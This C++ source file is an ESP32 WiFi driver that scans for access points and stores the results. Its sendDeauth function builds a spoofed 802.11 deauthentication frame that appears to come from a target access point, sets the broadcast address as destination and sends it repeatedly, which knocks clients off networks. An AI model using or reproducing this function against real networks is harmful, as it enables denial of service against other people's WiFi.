#include "hardware/wireless.h"

#include <cstring>
#include <esp_log.h>
#include <new>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>

#include "core/event.h"
#include "core/event_system.h"

static constexpr const char *TAG_WL = "Wireless";

Wireless &Wireless::instance()
{
    static Wireless w;
    return w;
}

Wireless::Wireless()
    : initialized_(false),
      scanning_(false),
      apCount_(0U),
      aps_(nullptr),
      instanceHandle_(nullptr)
{
}

bool Wireless::init()
{
    if (initialized_)
    {
        return true;
    }

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK)
    {
        ESP_LOGE(TAG_WL, "esp_wifi_init failed: %d", ret);
        return false;
    }

    ret = esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_SCAN_DONE,
                                              &Wireless::wifiEventHandler, this,
                                              &instanceHandle_);
    if (ret != ESP_OK)
    {
        ESP_LOGE(TAG_WL, "event handler register failed: %d", ret);
        esp_wifi_deinit();
        return false;
    }

    ret = esp_wifi_set_mode(WIFI_MODE_STA);
    if (ret != ESP_OK)
    {
        ESP_LOGE(TAG_WL, "esp_wifi_set_mode failed: %d", ret);
        esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, instanceHandle_);
        instanceHandle_ = nullptr;
        esp_wifi_deinit();
        return false;
    }

    ret = esp_wifi_start();
    if (ret != ESP_OK)
    {
        ESP_LOGE(TAG_WL, "esp_wifi_start failed: %d", ret);
        esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, instanceHandle_);
        instanceHandle_ = nullptr;
        esp_wifi_deinit();
        return false;
    }

    initialized_ = true;
    ESP_LOGI(TAG_WL, "WiFi initialised in STA mode");
    return true;
}

void Wireless::deinit()
{
    if (!initialized_)
    {
        return;
    }

    esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, instanceHandle_);
    instanceHandle_ = nullptr;
    esp_wifi_stop();
    esp_wifi_deinit();

    delete[] aps_;
    aps_ = nullptr;
    apCount_ = 0U;
    scanning_ = false;
    initialized_ = false;
    ESP_LOGI(TAG_WL, "WiFi deinitialised");
}

bool Wireless::startScan()
{
    if (!initialized_ || scanning_)
    {
        return false;
    }

    // Free previous results before starting a new scan
    delete[] aps_;
    aps_ = nullptr;
    apCount_ = 0U;

    wifi_scan_config_t scanConfig = {};
    scanConfig.ssid = nullptr;
    scanConfig.bssid = nullptr;
    scanConfig.channel = 0U;
    scanConfig.show_hidden = true;
    scanConfig.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    scanConfig.scan_time.active.min = 100U;
    scanConfig.scan_time.active.max = 300U;

    const esp_err_t err = esp_wifi_scan_start(&scanConfig, false);
    if (err != ESP_OK)
    {
        ESP_LOGE(TAG_WL, "esp_wifi_scan_start failed: %d", err);
        return false;
    }

    scanning_ = true;
    ESP_LOGI(TAG_WL, "Async scan started");
    return true;
}

bool Wireless::isScanning() const
{
    return scanning_;
}

uint8_t Wireless::apCount() const
{
    return apCount_;
}

const Wireless::ApRecord *Wireless::aps() const
{
    return aps_;
}

bool Wireless::sendDeauth(const uint8_t *bssid, uint8_t channel, uint8_t count)
{
    if (!initialized_ || bssid == nullptr || count == 0U)
    {
        return false;
    }

    // IEEE 802.11 deauthentication frame (26 bytes)
    // SA = BSSID so that connected clients accept the frame as coming from the AP.
    // DA = broadcast so all associated stations receive it.
    uint8_t frame[26] = {0U};
    frame[0] = 0xC0U; // Frame Control: management, subtype 12 (deauth)
    frame[1] = 0x00U;
    frame[2] = 0x00U; // Duration
    frame[3] = 0x00U;
    // DA: broadcast
    frame[4] = 0xFFU; frame[5] = 0xFFU; frame[6] = 0xFFU;
    frame[7] = 0xFFU; frame[8] = 0xFFU; frame[9] = 0xFFU;
    // SA: BSSID
    std::memcpy(&frame[10], bssid, 6U);
    // BSSID
    std::memcpy(&frame[16], bssid, 6U);
    // Sequence Control
    frame[22] = 0x00U;
    frame[23] = 0x00U;
    // Reason Code: 7 – class-3 frame from non-associated station
    frame[24] = 0x07U;
    frame[25] = 0x00U;

    (void)esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    bool success = true;
    for (uint8_t i = 0U; i < count; ++i)
    {
        const esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        if (err != ESP_OK)
        {
            ESP_LOGE(TAG_WL, "deauth tx failed: %d", err);
            success = false;
            break;
        }
    }

    return success;
}

// ── Private helpers ───────────────────────────────────────────────────────────

void Wireless::wifiEventHandler(void *arg, esp_event_base_t eventBase,
                                int32_t eventId, void *eventData)
{
    (void)eventBase;
    (void)eventId;
    (void)eventData;

    auto *self = static_cast<Wireless *>(arg);
    if (self != nullptr)
    {
        self->onScanDone();
    }
}

void Wireless::onScanDone()
{
    uint16_t numAps = 0U;
    esp_wifi_scan_get_ap_num(&numAps);

    if (numAps > MAX_APS)
    {
        numAps = MAX_APS;
    }

    if (numAps == 0U)
    {
        scanning_ = false;
        apCount_ = 0U;
        const Event evt{EventType::EVT_WIFI_SCAN_DONE, 0, 0, nullptr};
        EventSystem::instance().postEvent(evt);
        return;
    }

    auto *newAps = new (std::nothrow) ApRecord[numAps];
    if (newAps == nullptr)
    {
        ESP_LOGE(TAG_WL, "OOM allocating AP records");
        scanning_ = false;
        apCount_ = 0U;
        const Event evt{EventType::EVT_WIFI_SCAN_DONE, 0, 0, nullptr};
        EventSystem::instance().postEvent(evt);
        return;
    }

    {
        auto *rawAps = new (std::nothrow) wifi_ap_record_t[numAps];
        if (rawAps == nullptr)
        {
            ESP_LOGE(TAG_WL, "OOM allocating raw AP buffer");
            delete[] newAps;
            scanning_ = false;
            apCount_ = 0U;
            const Event evt{EventType::EVT_WIFI_SCAN_DONE, 0, 0, nullptr};
            EventSystem::instance().postEvent(evt);
            return;
        }

        uint16_t n = numAps;
        if (esp_wifi_scan_get_ap_records(&n, rawAps) == ESP_OK)
        {
            for (uint16_t i = 0U; i < n; ++i)
            {
                std::memcpy(newAps[i].ssid, rawAps[i].ssid, 32U);
                newAps[i].ssid[32] = '\0';
                std::memcpy(newAps[i].bssid, rawAps[i].bssid, 6U);
                newAps[i].rssi = rawAps[i].rssi;
                newAps[i].channel = rawAps[i].primary;
                newAps[i].authmode = rawAps[i].authmode;
            }
            apCount_ = static_cast<uint8_t>(n);
        }
        delete[] rawAps;
    }

    delete[] aps_;
    aps_ = newAps;
    scanning_ = false;

    ESP_LOGI(TAG_WL, "Scan complete: %u AP(s) found", static_cast<unsigned>(apCount_));

    const Event evt{EventType::EVT_WIFI_SCAN_DONE, static_cast<int32_t>(apCount_), 0, nullptr};
    EventSystem::instance().postEvent(evt);
}
